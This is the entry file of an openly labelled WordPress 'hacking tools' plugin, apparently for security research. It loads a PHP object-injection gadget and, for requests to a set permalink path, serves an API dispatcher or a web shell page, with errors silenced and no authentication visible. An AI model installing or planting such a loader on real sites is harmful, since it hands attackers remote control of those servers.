<?php
/**
 * Plugin Name: Stealth
 * Plugin URI: https://github.com/stealthcopter/wordpress-hacking/tree/plugin
 * Description: Some hacking tools for stuff and things.
 * Version: 0.0.1
 * Author: stealthcopter
 * Author URI: https://sec.stealthcopter.com/
 */

// This seems to be needed when using symlinks to host the folder. Stupid PHP.
if (function_exists('opcache_reset')) {
    // Fix crash on Windows (thanks to xnl-h4ck3r)
    opcache_reset();
}

require_once 'inc/loader.php';

if (!defined('STEALTH_PLUGIN_FILE')) {
    // We do this nasty shit so we can support loading via symlinked directories without explosions.
    define('STEALTH_PLUGIN_FILE', WP_PLUGIN_DIR . '/' . basename(dirname(__FILE__)) . '/' . basename(__FILE__));
}

if (!defined('STEALTH_PLUGIN_PATH')) {
    define('STEALTH_PLUGIN_PATH', WP_PLUGIN_DIR . '/' . basename(dirname(__FILE__)));
}

// Silence warnings
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_DEPRECATED);

// Load the PHP object gadget
require_once STEALTH_PLUGIN_PATH . '/payloads/php_obj.php';

function init_stealth()
{
    require_once STEALTH_PLUGIN_PATH . '/config.php';
    require_once STEALTH_PLUGIN_PATH . '/inc/code.php';
    require_once STEALTH_PLUGIN_PATH . '/inc/shortcodes.php';
    require_once STEALTH_PLUGIN_PATH . '/inc/filters.php';
    require_once STEALTH_PLUGIN_PATH . '/inc/rest.php';
    require_once STEALTH_PLUGIN_PATH . '/inc/api/router.php';
}

function stealth_handle_request()
{
    if (isset($_REQUEST['stealth_api'])) {
        stealth_api_dispatch();
        die();
    }
    require_once STEALTH_PLUGIN_PATH . '/frontend/shell.php';
    die();
}

if (is_installed_to_wordpress()) {
    add_action('init', 'init_stealth');

    add_action('parse_request', 'stealth_url_handler');
    function stealth_url_handler($query_args)
    {
        $requestPath = parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH);
        $url = trailingslashit($requestPath);
        if (strstr($url, STEALTH_PERMALINK_PATH)) {
            stealth_handle_request();
        }
    }

} else {
    init_stealth();
    stealth_handle_request();
}
